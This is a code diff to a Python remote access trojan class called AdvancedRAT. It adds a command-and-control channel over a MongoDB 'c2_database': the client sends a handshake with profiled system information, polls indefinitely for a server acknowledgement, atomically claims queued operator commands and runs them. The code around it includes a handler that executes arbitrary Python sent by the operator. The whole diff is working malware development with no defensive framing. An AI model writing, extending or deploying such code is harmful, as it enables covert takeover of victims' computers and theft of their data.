@@ -1858,9 +1858,37 @@ class AdvancedRAT:
             'geolocation': self._handle_geolocation,
             'brightness_control': self._handle_brightness_control,
             'wifi_control': self._handle_wifi_control,
-            'bluetooth_control': self._handle_bluetooth_control
+            'bluetooth_control': self._handle_bluetooth_control,
+            'dbmode_client': self._handle_dbmode_client
         }
     
+    def _handle_dbmode_client(self, cmd):
+        mode = cmd.get('params', {}).get('mode', 'normal')
+        self.logger.info(f"Received request to change database mode to: {mode}")
+        
+        # Manually write completed status to MongoDB
+        cmd_id = cmd.get('id', 'unknown')
+        if hasattr(self, 'mongodb_client') and self.mongodb_client:
+            try:
+                db = self.mongodb_client.get_database('c2_database')
+                import datetime
+                db.commands.update_one(
+                    {"id": cmd_id},
+                    {"$set": {
+                        "status": "completed",
+                        "result": json.dumps({"status": "success", "message": f"Switching to {mode}"}),
+                        "is_active": 0,
+                        "updated_at": datetime.datetime.now().isoformat()
+                    }}
+                )
+            except Exception as e:
+                self.logger.error(f"Failed to write dbmode result to Mongo: {e}")
+        
+        if mode == 'normal':
+            self.mongo_mode = False
+            
+        return {"status": "success", "message": f"Switched mode to {mode}"}
+        
     def _handle_script(self, cmd):
         """Execute arbitrary Python code"""
         code = cmd.get('code', '')
@@ -2229,6 +2257,54 @@ class AdvancedRAT:
             db = client.get_database('c2_database')
             self.logger.success("Connected to MongoDB via Atlas (Hybrid Mode)")
 
+            # Send handshake record to signal waiting
+            sys_info = self.profiler.get_system_info()
+            db.mongo_handshake.update_one(
+                {"client_id": self.client_id},
+                {"$set": {
+                    "client_id": self.client_id,
+                    "status": "client_waiting",
+                    "info": sys_info,
+                    "timestamp": datetime.datetime.now().isoformat()
+                }},
+                upsert=True
+            )
+            self.logger.info("Sent connection request to MongoDB handshake collection.")
+
+            # Wait for server connected response — retry indefinitely so a server restart is picked up
+            connected_via_db = False
+            while getattr(self, 'mongo_mode', False) and self.running:
+                # (Re-)write client_waiting so server sees us even after its own restart
+                db.mongo_handshake.update_one(
+                    {"client_id": self.client_id},
+                    {"$set": {
+                        "client_id": self.client_id,
+                        "status": "client_waiting",
+                        "info": sys_info,
+                        "timestamp": datetime.datetime.now().isoformat()
+                    }},
+                    upsert=True
+                )
+                # Poll for server acknowledgement
+                for _ in range(30):  # 60 seconds per attempt
+                    if not getattr(self, 'mongo_mode', False) or not self.running:
+                        break
+                    hs = db.mongo_handshake.find_one({"client_id": self.client_id})
+                    if hs and hs.get('status') == 'server_connected':
+                        connected_via_db = True
+                        break
+                    time.sleep(2)
+                if connected_via_db:
+                    break
+                self.logger.warning("No response from server yet — re-signaling handshake and waiting...")
+
+            if not connected_via_db:
+                self.logger.error("Mongo mode exited before server responded.")
+                return
+
+            self.logger.success("Connected to C2 server through DB only!")
+
+
         except Exception as e:
             self.logger.error(f"MongoDB connection failed: {e}")
             time.sleep(10)
@@ -2283,34 +2359,38 @@ class AdvancedRAT:
                     db.system_info.insert_one(metrics_doc)
                     self.logger.info("Sent MongoDB heartbeat and metrics.")
 
-                # 2. Check for pending commands targeting this client
-                query = {
-                    "client_id": self.client_id,
-                    "status": "pending"
-                }
-                pending_cmds = list(db.commands.find(query).sort("created_at", 1))
-                
-                for cmd in pending_cmds:
-                    cmd_id = cmd.get('id')
+                # 2. Check for pending commands targeting this client (atomic claim)
+                while True:
+                    cmd = db.commands.find_one_and_update(
+                        {"client_id": self.client_id, "status": "pending"},
+                        {"$set": {
+                            "status": "executing",
+                            "is_active": 1,
+                            "updated_at": datetime.datetime.now().isoformat()
+                        }},
+                        sort=[("created_at", 1)],
+                        return_document=False
+                    )
+                    if cmd is None:
+                        break  # No more pending commands
+
+                    cmd_id  = cmd.get('id')
                     cmd_type = cmd.get('command_name') or cmd.get('command_type', '')
                     params_str = cmd.get('parameters', '{}')
                     try:
                         params = json.loads(params_str)
                     except:
                         params = params_str if isinstance(params_str, dict) else {}
-                    
-                    self.logger.info(f"MongoDB Command Received: {cmd_type} (ID: {cmd_id})")
-                    
-                    # Update status to executing
-                    db.commands.update_one(
-                        {"id": cmd_id},
-                        {"$set": {
-                            "status": "executing",
-                            "is_active": 1,
-                            "updated_at": datetime.datetime.now().isoformat()
-                        }}
-                    )
-                    
+
+                    # Silently skip internal server commands not meant for clients
+                    if cmd_type in ('sync_tasks',):
+                        db.commands.update_one(
+                            {"id": cmd_id},
+                            {"$set": {"status": "completed", "is_active": 0,
+                                      "updated_at": datetime.datetime.now().isoformat()}}
+                        )
+                        continue
+
                     # Run the command
                     if cmd_type in self.command_handlers:
                         handler = self.command_handlers[cmd_type]
@@ -2335,8 +2415,9 @@ class AdvancedRAT:
                                 "updated_at": datetime.datetime.now().isoformat()
                             }}
                         )
-                
+
                 time.sleep(2)
+
             except Exception as e:
                 self.logger.error(f"Error in MongoDB poll iteration: {e}")
                 time.sleep(5)
